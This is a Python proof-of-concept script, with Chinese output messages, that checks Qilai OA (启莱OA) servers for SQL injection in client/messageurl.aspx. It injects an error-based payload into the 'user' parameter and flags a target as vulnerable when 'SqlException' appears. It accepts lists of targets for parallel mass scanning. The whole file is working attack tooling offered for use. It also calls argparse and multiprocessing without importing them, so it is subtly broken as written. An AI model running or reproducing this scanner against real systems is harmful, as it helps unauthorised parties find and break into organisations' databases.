import time

import requests


def now_time():
    return time.strftime("[%H:%M:%S] ", time.localtime())


proxies = {'http': 'http://127.0.0.1:8080'}


def main(target_url):
    if target_url[:4] != 'http':
        target_url = 'http://' + target_url
    if target_url[-1] != '/':
        target_url += '/'
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:50.0) Gecko/20100101 Firefox/50.0",
    }
    vuln_url = target_url + "client/messageurl.aspx?user=' and (select db_name())>0--&pwd=1"
    print(now_time() + " [INFO]     正在检测启莱OA messageurl.aspx SQL注入漏洞")
    try:
        requests.packages.urllib3.disable_warnings()
        respones = requests.get(vuln_url, headers=headers, verify=False)
        if "SqlException" in respones.text:
            print(now_time() + ' [SUCCESS]  启莱OA messageurl.aspx SQL注入漏洞 存在{}'.format(vuln_url))
        else:
            print(now_time() + ' [WARNING]  启莱OA messageurl.aspx SQL注入漏洞不存在')
    except:
        print(now_time() + " [ERROR]    无法利用poc请求目标或被目标拒绝请求, ")


if __name__ == "__main__":
    try:
        parser = argparse.ArgumentParser()
        parser.add_argument('-u', '--url', dest='url', help='Target Url')
        parser.add_argument('-f', '--file', dest='file', help='Target Url File', type=argparse.FileType('r'))
        args = parser.parse_args()
        if args.file:
            pool = multiprocessing.Pool()
            for url in args.file:
                pool.apply_async(main, args=(url.strip('\n'),))
            pool.close()
            pool.join()
        elif args.url:
            main(args.url)
        else:
            print('缺少URL目标, 请使用 [-u URL] or [-f FILE]')
    except KeyboardInterrupt:
        print('\nCTRL+C 退出')
